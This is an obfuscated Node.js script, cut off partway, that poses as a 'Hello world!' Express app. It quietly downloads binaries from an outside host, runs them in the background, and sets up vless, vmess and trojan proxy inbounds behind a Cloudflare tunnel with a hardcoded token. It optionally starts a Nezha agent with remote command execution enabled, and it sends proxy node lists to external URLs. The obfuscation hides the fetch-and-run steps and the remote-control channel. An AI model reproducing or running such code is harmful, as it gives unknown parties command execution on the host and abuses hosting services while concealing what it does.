const _0x55b4b4=_0x2409;(function(_0x1ca56a,_0x104956){const _0x57e9a5={_0x24b5a9:0x1ed,_0x39cc21:0x264,_0x1faaa5:0x1d4},_0x395fd7=_0x2409,_0x5c0a9b=_0x1ca56a();while(!![]){try{const _0x206495=-parseInt(_0x395fd7(0x21e))/0x1+parseInt(_0x395fd7(0x1e3))/0x2*(-parseInt(_0x395fd7(_0x57e9a5._0x24b5a9))/0x3)+-parseInt(_0x395fd7(_0x57e9a5._0x39cc21))/0x4+-parseInt(_0x395fd7(0x1cf))/0x5+-parseInt(_0x395fd7(0x1c9))/0x6+parseInt(_0x395fd7(0x259))/0x7+parseInt(_0x395fd7(_0x57e9a5._0x1faaa5))/0x8;if(_0x206495===_0x104956)break;else _0x5c0a9b['push'](_0x5c0a9b['shift']());}catch(_0x455dc8){_0x5c0a9b['push'](_0x5c0a9b['shift']());}}}(_0x9227,0x7c98f));const express=require(_0x55b4b4(0x255)),app=express(),axios=require(_0x55b4b4(0x1d9)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x55b4b4(0x238)),exec=promisify(require(_0x55b4b4(0x217))[_0x55b4b4(0x1d5)]),{execSync}=require(_0x55b4b4(0x217)),UPLOAD_URL=process[_0x55b4b4(0x23a)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x55b4b4(0x27b)]||'',AUTO_ACCESS=process[_0x55b4b4(0x23a)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x55b4b4(0x23a)][_0x55b4b4(0x252)]||_0x55b4b4(0x1c7),SUB_PATH=process[_0x55b4b4(0x23a)]['SUB_PATH']||_0x55b4b4(0x21c),PORT=process[_0x55b4b4(0x23a)]['SERVER_PORT']||process['env']['PORT']||0xbb8,UUID=process[_0x55b4b4(0x23a)][_0x55b4b4(0x207)]||_0x55b4b4(0x1c4),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x55b4b4(0x23a)][_0x55b4b4(0x245)]||'',ARGO_DOMAIN=process['env'][_0x55b4b4(0x21a)]||'leafflow.pkp.xx.kg',ARGO_AUTH=process['env'][_0x55b4b4(0x20b)]||_0x55b4b4(0x277),ARGO_PORT=process[_0x55b4b4(0x23a)][_0x55b4b4(0x270)]||0x1f41,CFIP=process[_0x55b4b4(0x23a)][_0x55b4b4(0x239)]||_0x55b4b4(0x224),CFPORT=process[_0x55b4b4(0x23a)][_0x55b4b4(0x26b)]||0x1bb,NAME=process[_0x55b4b4(0x23a)][_0x55b4b4(0x1bd)]||_0x55b4b4(0x1c2);function _0x2409(_0x397dc5,_0x530b57){const _0x92273d=_0x9227();return _0x2409=function(_0x2409c6,_0x53faf3){_0x2409c6=_0x2409c6-0x1b8;let _0x22c1f9=_0x92273d[_0x2409c6];return _0x22c1f9;},_0x2409(_0x397dc5,_0x530b57);}!fs[_0x55b4b4(0x221)](FILE_PATH)?(fs[_0x55b4b4(0x22a)](FILE_PATH),console[_0x55b4b4(0x210)](FILE_PATH+_0x55b4b4(0x231))):console[_0x55b4b4(0x210)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4e0c33={_0xad154c:0x253,_0x2cd411:0x20a},_0x9acd9c=_0x55b4b4,_0x3d22e3=_0x9acd9c(_0x4e0c33._0xad154c);let _0x28cf38='';for(let _0x2705d8=0x0;_0x2705d8<0x6;_0x2705d8++){_0x28cf38+=_0x3d22e3[_0x9acd9c(_0x4e0c33._0x2cd411)](Math[_0x9acd9c(0x248)](Math[_0x9acd9c(0x1c8)]()*_0x3d22e3[_0x9acd9c(0x1ee)]));}return _0x28cf38;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x55b4b4(0x269)](FILE_PATH,npmName),phpPath=path[_0x55b4b4(0x269)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x55b4b4(0x269)](FILE_PATH,botName),subPath=path[_0x55b4b4(0x269)](FILE_PATH,_0x55b4b4(0x1f5)),listPath=path[_0x55b4b4(0x269)](FILE_PATH,_0x55b4b4(0x24f)),bootLogPath=path[_0x55b4b4(0x269)](FILE_PATH,'boot.log'),configPath=path[_0x55b4b4(0x269)](FILE_PATH,_0x55b4b4(0x1f6));function deleteNodes(){const _0x3a9f7f={_0x43b504:0x221,_0x375db4:0x1d0,_0x170118:0x27a,_0x323552:0x273,_0x4f2db2:0x232,_0x344ca6:0x26d},_0xfb0def=_0x55b4b4;try{if(!UPLOAD_URL)return;if(!fs[_0xfb0def(_0x3a9f7f._0x43b504)](subPath))return;let _0x176cef;try{_0x176cef=fs[_0xfb0def(_0x3a9f7f._0x375db4)](subPath,_0xfb0def(0x273));}catch{return null;}const _0x2fe6f4=Buffer[_0xfb0def(_0x3a9f7f._0x170118)](_0x176cef,'base64')[_0xfb0def(0x1ef)](_0xfb0def(_0x3a9f7f._0x323552)),_0x226e90=_0x2fe6f4[_0xfb0def(0x1e0)]('\x0a')['filter'](_0x109fa6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xfb0def(0x26a)](_0x109fa6));if(_0x226e90['length']===0x0)return;return axios['post'](UPLOAD_URL+_0xfb0def(0x213),JSON[_0xfb0def(_0x3a9f7f._0x4f2db2)]({'nodes':_0x226e90}),{'headers':{'Content-Type':_0xfb0def(_0x3a9f7f._0x344ca6)}})[_0xfb0def(0x1d7)](_0x12e59e=>{return null;}),null;}catch(_0x4e5f2d){return null;}}function cleanupOldFiles(){const _0x5c4d01={_0x99b57d:0x1d6},_0x326326={_0x296dd2:0x1db,_0x50c97b:0x1c1},_0x2a8344=_0x55b4b4;try{const _0x540e5c=fs[_0x2a8344(_0x5c4d01._0x99b57d)](FILE_PATH);_0x540e5c['forEach'](_0x284854=>{const _0x498e51=_0x2a8344,_0x563c6a=path[_0x498e51(0x269)](FILE_PATH,_0x284854);try{const _0x22b9b0=fs[_0x498e51(_0x326326._0x296dd2)](_0x563c6a);_0x22b9b0[_0x498e51(0x214)]()&&fs[_0x498e51(_0x326326._0x50c97b)](_0x563c6a);}catch(_0x303608){}});}catch(_0xe7a944){}}app[_0x55b4b4(0x24b)]('/',function(_0x431af9,_0x19d507){const _0x364ac9={_0x201835:0x274,_0x23e254:0x22d},_0x15dafd=_0x55b4b4;_0x19d507[_0x15dafd(_0x364ac9._0x201835)](_0x15dafd(_0x364ac9._0x23e254));});async function generateConfig(){const _0x22f04e={_0x167f26:0x1e2,_0x29cb3a:0x21d,_0x3f2418:0x205,_0x5099ca:0x227,_0x37a5e4:0x227,_0x2b4612:0x279,_0x2790d1:0x1cb,_0x5d9133:0x246,_0x1b0cb0:0x26e,_0x3e8dc7:0x26f,_0x2235d8:0x230,_0x18fc09:0x241,_0x1cffb0:0x243},_0x682df0=_0x55b4b4,_0x2c2eb6={'log':{'access':_0x682df0(0x1b8),'error':_0x682df0(0x1b8),'loglevel':_0x682df0(0x227)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x682df0(_0x22f04e._0x167f26)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x682df0(0x279),'dest':0xbba},{'path':_0x682df0(0x1ec),'dest':0xbbb},{'path':_0x682df0(_0x22f04e._0x29cb3a),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x682df0(0x1cb),'protocol':_0x682df0(0x1ea),'settings':{'clients':[{'id':UUID}],'decryption':_0x682df0(0x227)},'streamSettings':{'network':_0x682df0(_0x22f04e._0x3f2418),'security':_0x682df0(_0x22f04e._0x5099ca)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x682df0(_0x22f04e._0x37a5e4),'wsSettings':{'path':_0x682df0(_0x22f04e._0x2b4612)}},'sniffing':{'enabled':!![],'destOverride':[_0x682df0(0x26e),_0x682df0(0x1fc),_0x682df0(0x26f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x682df0(_0x22f04e._0x2790d1),'protocol':_0x682df0(_0x22f04e._0x5d9133),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x682df0(0x26e),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x682df0(0x1cb),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x682df0(0x21d)}},'sniffing':{'enabled':!![],'destOverride':[_0x682df0(_0x22f04e._0x1b0cb0),_0x682df0(0x1fc),_0x682df0(_0x22f04e._0x3e8dc7)],'metadataOnly':![]}}],'dns':{'servers':[_0x682df0(_0x22f04e._0x2235d8)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x682df0(_0x22f04e._0x18fc09),'tag':'block'}]};fs[_0x682df0(_0x22f04e._0x1cffb0)](path['join'](FILE_PATH,'config.json'),JSON['stringify'](_0x2c2eb6,null,0x2));}function getSystemArchitecture(){const _0x52e722={_0x590d8f:0x228,_0xf608cf:0x23b},_0x52cd36=_0x55b4b4,_0x2879d9=os['arch']();return _0x2879d9===_0x52cd36(_0x52e722._0x590d8f)||_0x2879d9===_0x52cd36(_0x52e722._0xf608cf)||_0x2879d9===_0x52cd36(0x275)?_0x52cd36(0x228):_0x52cd36(0x23e);}function downloadFile(_0x13727e,_0x434e3b,_0x2cdcd7){const _0x4ac703={_0x1292ed:0x221,_0x3b3f93:0x22a,_0x513a3e:0x223,_0x4725fa:0x24b},_0x3e7765={_0x58a9d9:0x229},_0x47f125={_0x481495:0x23c},_0x4d0c06=_0x55b4b4,_0x322c67=_0x13727e;!fs[_0x4d0c06(_0x4ac703._0x1292ed)](FILE_PATH)&&fs[_0x4d0c06(_0x4ac703._0x3b3f93)](FILE_PATH,{'recursive':!![]});const _0x9246c9=fs[_0x4d0c06(_0x4ac703._0x513a3e)](_0x322c67);axios({'method':_0x4d0c06(_0x4ac703._0x4725fa),'url':_0x434e3b,'responseType':_0x4d0c06(0x1e7)})[_0x4d0c06(0x204)](_0x24949=>{const _0xa0227c={_0x2c0af5:0x265},_0x563847={_0x124bab:0x229},_0x4d3590=_0x4d0c06;_0x24949[_0x4d3590(_0x47f125._0x481495)]['pipe'](_0x9246c9),_0x9246c9['on']('finish',()=>{const _0x1a3c17=_0x4d3590;_0x9246c9[_0x1a3c17(0x25a)](),console[_0x1a3c17(0x210)]('Download\x20'+path[_0x1a3c17(_0x563847._0x124bab)](_0x322c67)+_0x1a3c17(0x216)),_0x2cdcd7(null,_0x322c67);}),_0x9246c9['on'](_0x4d3590(0x1ff),_0x5aa2f5=>{const _0x48ce49=_0x4d3590;fs[_0x48ce49(0x22c)](_0x322c67,()=>{});const _0x585349=_0x48ce49(_0xa0227c._0x2c0af5)+path[_0x48ce49(0x229)](_0x322c67)+'\x20failed:\x20'+_0x5aa2f5['message'];console['error'](_0x585349),_0x2cdcd7(_0x585349);});})['catch'](_0x4c790d=>{const _0x845c77=_0x4d0c06,_0x192c88=_0x845c77(0x265)+path[_0x845c77(_0x3e7765._0x58a9d9)](_0x322c67)+'\x20failed:\x20'+_0x4c790d[_0x845c77(0x218)];console[_0x845c77(0x1ff)](_0x192c88),_0x2cdcd7(_0x192c88);});}async function downloadFilesAndRun(){const _0xa47e97={_0x43ef01:0x1ee,_0x4442d3:0x1e5,_0x557e91:0x1ff,_0x1f90a6:0x237,_0x3290d0:0x1bc,_0x1fc698:0x24d,_0x1a9224:0x1bb,_0x4a3dff:0x24c,_0x27314c:0x219,_0x2ea6d8:0x20f,_0x15f7d8:0x1fa,_0x2cc1f1:0x222,_0x2452d7:0x1c6,_0x4bdb37:0x1da,_0x361e3a:0x22b,_0x1aa883:0x25d,_0x4aa5ee:0x212,_0x59a8ed:0x1d1,_0x110b87:0x210,_0xe6c224:0x24e,_0x35024d:0x200,_0x436c60:0x267,_0x4a89d4:0x1de,_0x2095f3:0x1be,_0x2804e1:0x1ff},_0x1d3f31={_0x21eaf4:0x215},_0x5436c7=_0x55b4b4,_0x8811b4=getSystemArchitecture(),_0x2e6a97=getFilesForArchitecture(_0x8811b4);if(_0x2e6a97[_0x5436c7(_0xa47e97._0x43ef01)]===0x0){console['log'](_0x5436c7(0x1f2));return;}const _0x4ac757=_0x2e6a97[_0x5436c7(_0xa47e97._0x4442d3)](_0x4f8668=>{const _0x11ca69={_0x21035a:0x202};return new Promise((_0x332ab4,_0x1f298a)=>{const _0x31122f=_0x2409;downloadFile(_0x4f8668[_0x31122f(_0x11ca69._0x21035a)],_0x4f8668[_0x31122f(0x247)],(_0x18bfaf,_0x5ec78b)=>{_0x18bfaf?_0x1f298a(_0x18bfaf):_0x332ab4(_0x5ec78b);});});});try{await Promise[_0x5436c7(0x1f3)](_0x4ac757);}catch(_0x8dd8b1){console[_0x5436c7(_0xa47e97._0x557e91)](_0x5436c7(0x22e),_0x8dd8b1);return;}function _0x44276a(_0x5d2f4e){const _0x2a4103={_0x1f8b11:0x1ff,_0x31b7a1:0x1bf},_0x17e00b=_0x5436c7,_0x1cb40b=0x1fd;_0x5d2f4e[_0x17e00b(_0x1d3f31._0x21eaf4)](_0x4213fa=>{const _0x44e98b=_0x17e00b;fs[_0x44e98b(0x221)](_0x4213fa)&&fs[_0x44e98b(0x1e4)](_0x4213fa,_0x1cb40b,_0x2ba02b=>{const _0x449c4b=_0x44e98b;_0x2ba02b?console[_0x449c4b(_0x2a4103._0x1f8b11)](_0x449c4b(_0x2a4103._0x31b7a1)+_0x4213fa+':\x20'+_0x2ba02b):console[_0x449c4b(0x210)]('Empowerment\x20success\x20for\x20'+_0x4213fa+':\x20'+_0x1cb40b[_0x449c4b(0x1ef)](0x8));});});}const _0x48e182=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x44276a(_0x48e182);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x488b40=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x5436c7(0x1f0)]():'',_0x2a2e7f=new Set(['443',_0x5436c7(_0xa47e97._0x1f90a6),_0x5436c7(_0xa47e97._0x3290d0),_0x5436c7(_0xa47e97._0x1fc698),'2083',_0x5436c7(0x234)]),_0x374341=_0x2a2e7f[_0x5436c7(_0xa47e97._0x1a9224)](_0x488b40)?'true':'false',_0x7b3f60=_0x5436c7(_0xa47e97._0x4a3dff)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5436c7(_0xa47e97._0x27314c)+_0x374341+_0x5436c7(0x24a)+UUID;fs[_0x5436c7(0x243)](path[_0x5436c7(0x269)](FILE_PATH,_0x5436c7(0x1cc)),_0x7b3f60);const _0x18a174='nohup\x20'+phpPath+_0x5436c7(_0xa47e97._0x2ea6d8)+FILE_PATH+_0x5436c7(_0xa47e97._0x15f7d8);try{await exec(_0x18a174),console[_0x5436c7(0x210)](phpName+_0x5436c7(_0xa47e97._0x2cc1f1)),await new Promise(_0x382d7e=>setTimeout(_0x382d7e,0x3e8));}catch(_0xd9f57e){console['error'](_0x5436c7(_0xa47e97._0x2452d7)+_0xd9f57e);}}else{let _0x541b18='';const _0x1339a4=['443',_0x5436c7(0x237),_0x5436c7(0x1bc),_0x5436c7(0x24d),_0x5436c7(_0xa47e97._0x4bdb37),_0x5436c7(0x234)];_0x1339a4[_0x5436c7(_0xa47e97._0x361e3a)](NEZHA_PORT)&&(_0x541b18='--tls');const _0x66b067='nohup\x20'+npmPath+_0x5436c7(_0xa47e97._0x1aa883)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5436c7(_0xa47e97._0x4aa5ee)+NEZHA_KEY+'\x20'+_0x541b18+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x66b067),console[_0x5436c7(0x210)](npmName+'\x20is\x20running'),await new Promise(_0x5c82aa=>setTimeout(_0x5c82aa,0x3e8));}catch(_0x494c4c){console[_0x5436c7(_0xa47e97._0x557e91)](_0x5436c7(0x1ce)+_0x494c4c);}}}else console[_0x5436c7(0x210)](_0x5436c7(_0xa47e97._0x59a8ed));const _0x4da2f0='nohup\x20'+webPath+_0x5436c7(0x262)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4da2f0),console[_0x5436c7(_0xa47e97._0x110b87)](webName+_0x5436c7(0x222)),await new Promise(_0x33e480=>setTimeout(_0x33e480,0x3e8));}catch(_0x7bc100){console[_0x5436c7(_0xa47e97._0x557e91)](_0x5436c7(0x20c)+_0x7bc100);}if(fs[_0x5436c7(0x221)](botPath)){let _0x4b3006;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4b3006=_0x5436c7(_0xa47e97._0xe6c224)+ARGO_AUTH;else ARGO_AUTH[_0x5436c7(_0xa47e97._0x35024d)](/TunnelSecret/)?_0x4b3006=_0x5436c7(_0xa47e97._0x436c60)+FILE_PATH+_0x5436c7(0x1c0):_0x4b3006=_0x5436c7(0x1fe)+FILE_PATH+_0x5436c7(_0xa47e97._0x4a89d4)+ARGO_PORT;try{await exec(_0x5436c7(_0xa47e97._0x2095f3)+botPath+'\x20'+_0x4b3006+_0x5436c7(0x261)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x307ee4=>setTimeout(_0x307ee4,0x7d0));}catch(_0x174655){console[_0x5436c7(_0xa47e97._0x2804e1)]('Error\x20executing\x20command:\x20'+_0x174655);}}await new Promise(_0x4bd07a=>setTimeout(_0x4bd07a,0x1388));}function getFilesForArchitecture(_0x3d94af){const _0x5c8bf8={_0x40a374:0x254,_0x202a5a:0x22f},_0x42ce84=_0x55b4b4;let _0x54eeaf;_0x3d94af==='arm'?_0x54eeaf=[{'fileName':webPath,'fileUrl':_0x42ce84(0x1e6)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x54eeaf=[{'fileName':webPath,'fileUrl':_0x42ce84(0x1f4)},{'fileName':botPath,'fileUrl':_0x42ce84(_0x5c8bf8._0x40a374)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5aa715=_0x3d94af===_0x42ce84(0x228)?'https://arm64.ssss.nyc.mn/agent':_0x42ce84(0x257);_0x54eeaf['unshift']({'fileName':npmPath,'fileUrl':_0x5aa715});}else{const _0x2ac8f3=_0x3d94af===_0x42ce84(0x228)?_0x42ce84(0x268):_0x42ce84(_0x5c8bf8._0x202a5a);_0x54eeaf[_0x42ce84(0x25f)]({'fileName':phpPath,'fileUrl':_0x2ac8f3});}}return _0x54eeaf;}function argoType(){const _0x1af655={_0x3e2a80:0x22b,_0xb3e9ef:0x243,_0x5ab974:0x1c5,_0x3c8592:0x211,_0x42d6c8:0x269,_0x25a088:0x1dd,_0x5d78f1:0x249,_0x2d4fa5:0x1f7},_0x55b9a0=_0x55b4b4;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x55b9a0(0x210)](_0x55b9a0(0x20e));return;}if(ARGO_AUTH[_0x55b9a0(_0x1af655._0x3e2a80)](_0x55b9a0(0x1e1))){fs[_0x55b9a0(_0x1af655._0xb3e9ef)](path[_0x55b9a0(0x269)](FILE_PATH,_0x55b9a0(0x1f9)),ARGO_AUTH);const _0x220bc3=_0x55b9a0(_0x1af655._0x5ab974)+ARGO_AUTH[_0x55b9a0(0x1e0)]('\x22')[0xb]+_0x55b9a0(_0x1af655._0x3c8592)+path[_0x55b9a0(_0x1af655._0x42d6c8)](FILE_PATH,'tunnel.json')+_0x55b9a0(_0x1af655._0x25a088)+ARGO_DOMAIN+_0x55b9a0(0x276)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x55b9a0(0x243)](path['join'](FILE_PATH,_0x55b9a0(_0x1af655._0x5d78f1)),_0x220bc3);}else console['log'](_0x55b9a0(_0x1af655._0x2d4fa5));}function _0x9227(){const _0x224e4d=['/dev/null','Subscription\x20uploaded\x20successfully','firefox','has','2096','NAME','nohup\x20','Empowerment\x20failed\x20for\x20','/tunnel.yml\x20run','unlinkSync','leafflow','filter','3bb1bfeb-ddcc-470a-aefd-94a0771e92c2','\x0a\x20\x20tunnel:\x20','php\x20running\x20error:\x20','./tmp','random','4129146dDzEpv','Error\x20in\x20startserver:','127.0.0.1','config.yaml','?encryption=none&security=tls&sni=','npm\x20running\x20error:\x20','2683215YtHWod','readFileSync','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x22\x20>\x20/dev/null\x202>&1','\x0a\x20\x20\x20\x20','21031936prwHgi','exec','readdirSync','catch','https://ipapi.co/json/','axios','2083','statSync','push','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','clear','split','TunnelSecret','xtls-rprx-vision','2lOFfXw','chmod','map','https://arm64.ssss.nyc.mn/web','stream','del\x20/f\x20/q\x20','\x0a\x0avmess://','vless','http://ip-api.com/json/','/vmess-argo','1184127sibmyM','length','toString','pop','\x0a\x0atrojan://','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','all','https://amd64.ssss.nyc.mn/web','sub.txt','config.json','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','boot.log','tunnel.json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','countryCode','tls','Content-Type','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','error','match','\x20>\x20nul\x202>&1','fileName','/api/add-nodes','then','tcp','post','UUID','?security=tls&sni=','https://oooo.serv00.net/add-url','charAt','ARGO_AUTH','web\x20running\x20error:\x20','/api/add-subscriptions','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20-c\x20\x22','log','\x0a\x20\x20credentials-file:\x20','\x20-p\x20','/api/delete-nodes','isFile','forEach','\x20successfully','child_process','message','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ARGO_DOMAIN','Error\x20executing\x20command:\x20','wssb','/trojan-argo','665113gsNZOg','/sub.txt\x20saved\x20successfully','ArgoDomain:','existsSync','\x20is\x20running','createWriteStream','cdns.doon.eu.org','automatic\x20access\x20task\x20added\x20successfully','listen','none','arm','basename','mkdirSync','includes','unlink','Hello\x20world!','Error\x20downloading\x20files:','https://amd64.ssss.nyc.mn/v1','https+local://8.8.8.8/dns-query','\x20is\x20created','stringify','org','2053','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','&path=%2Ftrojan-argo%3Fed%3D2560#','8443','util','CFIP','env','arm64','data','substring','amd','Unknown','base64','blackhole','Unhandled\x20error\x20in\x20startserver:','writeFileSync','App\x20is\x20running','NEZHA_KEY','vmess','fileUrl','floor','tunnel.yml','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','get','\x0aclient_secret:\x20','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','list.txt','Error\x20reading\x20boot.log:','platform','FILE_PATH','abcdefghijklmnopqrstuvwxyz','https://amd64.ssss.nyc.mn/bot','express','\x0avless://','https://amd64.ssss.nyc.mn/agent','response','6839511BpsumL','close','Skipping\x20adding\x20automatic\x20access\x20task','http\x20server\x20is\x20running\x20on\x20port:','\x20-s\x20','country_code','unshift','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20>/dev/null\x202>&1\x20&','\x20-c\x20','.exe\x20>\x20nul\x202>&1','3244232KkTPIV','Download\x20','&fp=firefox&type=ws&host=','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://arm64.ssss.nyc.mn/v1','join','test','CFPORT','win32','application/json','http','quic','ARGO_PORT','text/plain;\x20charset=utf-8','rm\x20-rf\x20','utf-8','send','aarch64','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','eyJhIjoiMzQyNjNhYzk0NjViZjEwNjU2ZjQ1M2FmNDdhMzlkOGUiLCJ0IjoiZWZjY2MwN2YtZDNhZS00YjQwLWJkZDctYzViMmE0MWQ4ODJlIiwicyI6Ik1tVm1NVFJrTVdVdFpUTmxOeTAwWWpoa0xXSXdPV0l0WTJFNE5EZGpOekUwWkRRMyJ9','status','/vless-argo','from','PROJECT_URL','success'];_0x9227=function(){return _0x224e4d;};return _0x9227();}async function extractDomains(){const _0x35a4f2={_0x714759:0x273,_0x3676f6:0x1e0,_0x9b7079:0x210,_0x1b4aa7:0x220,_0x5bd6fc:0x210,_0xef8b97:0x1c1,_0x2f87e5:0x269,_0x2f35b2:0x1de,_0x2e508e:0x210,_0x4499e3:0x222,_0x4226c7:0x250},_0x503418={_0x28125b:0x1d8,_0x10ca22:0x23c,_0x2d56bd:0x23c,_0x3b1b47:0x25e,_0xe6d435:0x233,_0x49ea2e:0x1fb,_0x40ba49:0x233,_0x380b85:0x23f},_0x528ecf={_0x1cfd07:0x26c,_0x24b765:0x263},_0x5576ad={_0x232ce3:0x200,_0x3bcbee:0x1dc},_0xef7236=_0x55b4b4;let _0x48452e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x48452e=ARGO_DOMAIN,console[_0xef7236(0x210)]('ARGO_DOMAIN:',_0x48452e),await _0x1c21c4(_0x48452e);else try{const _0x4d0618=fs['readFileSync'](path[_0xef7236(0x269)](FILE_PATH,_0xef7236(0x1f8)),_0xef7236(_0x35a4f2._0x714759)),_0x2aa637=_0x4d0618[_0xef7236(_0x35a4f2._0x3676f6)]('\x0a'),_0x4c8516=[];_0x2aa637[_0xef7236(0x215)](_0xeed2f5=>{const _0x5653a6=_0xef7236,_0x3c3b8c=_0xeed2f5[_0x5653a6(_0x5576ad._0x232ce3)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3c3b8c){const _0x5026ad=_0x3c3b8c[0x1];_0x4c8516[_0x5653a6(_0x5576ad._0x3bcbee)](_0x5026ad);}});if(_0x4c8516[_0xef7236(0x1ee)]>0x0)_0x48452e=_0x4c8516[0x0],console[_0xef7236(_0x35a4f2._0x9b7079)](_0xef7236(_0x35a4f2._0x1b4aa7),_0x48452e),await _0x1c21c4(_0x48452e);else{console[_0xef7236(_0x35a4f2._0x5bd6fc)](_0xef7236(0x235)),fs[_0xef7236(_0x35a4f2._0xef8b97)](path[_0xef7236(_0x35a4f2._0x2f87e5)](FILE_PATH,_0xef7236(0x1f8)));async function _0x34754f(){const _0x34781e=_0xef7236;try{process[_0x34781e(0x251)]===_0x34781e(_0x528ecf._0x1cfd07)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x34781e(_0x528ecf._0x24b765)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x34781e(0x23d)](0x1)+_0x34781e(0x1d2));}catch(_0x1b0058){}}_0x34754f(),await new Promise(_0x5cede3=>setTimeout(_0x5cede3,0xbb8));const _0x3d3bd7='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xef7236(_0x35a4f2._0x2f35b2)+ARGO_PORT;try{await exec(_0xef7236(0x1be)+botPath+'\x20'+_0x3d3bd7+_0xef7236(0x261)),console[_0xef7236(_0x35a4f2._0x2e508e)](botName+_0xef7236(_0x35a4f2._0x4499e3)),await new Promise(_0x5cdb13=>setTimeout(_0x5cdb13,0xbb8)),await extractDomains();}catch(_0x48334a){console[_0xef7236(0x1ff)](_0xef7236(0x21b)+_0x48334a);}}}catch(_0x324b84){console['error'](_0xef7236(_0x35a4f2._0x4226c7),_0x324b84);}async function _0xfa616b(){const _0x20a68c=_0xef7236;try{const _0x549055=await axios[_0x20a68c(0x24b)](_0x20a68c(_0x503418._0x28125b),{'timeout':0xbb8});if(_0x549055[_0x20a68c(_0x503418._0x10ca22)]&&_0x549055[_0x20a68c(_0x503418._0x2d56bd)][_0x20a68c(_0x503418._0x3b1b47)]&&_0x549055[_0x20a68c(0x23c)]['org'])return _0x549055['data']['country_code']+'_'+_0x549055[_0x20a68c(_0x503418._0x2d56bd)][_0x20a68c(_0x503418._0xe6d435)];}catch(_0x249763){try{const _0x5a3d59=await axios[_0x20a68c(0x24b)](_0x20a68c(0x1eb),{'timeout':0xbb8});if(_0x5a3d59[_0x20a68c(0x23c)]&&_0x5a3d59[_0x20a68c(0x23c)]['status']===_0x20a68c(0x27c)&&_0x5a3d59[_0x20a68c(0x23c)][_0x20a68c(_0x503418._0x49ea2e)]&&_0x5a3d59['data'][_0x20a68c(_0x503418._0x40ba49)])return _0x5a3d59['data'][_0x20a68c(_0x503418._0x49ea2e)]+'_'+_0x5a3d59['data']['org'];}catch(_0x16dbb4){}}return _0x20a68c(_0x503418._0x380b85);}async function _0x1c21c4(_0x205e12){const 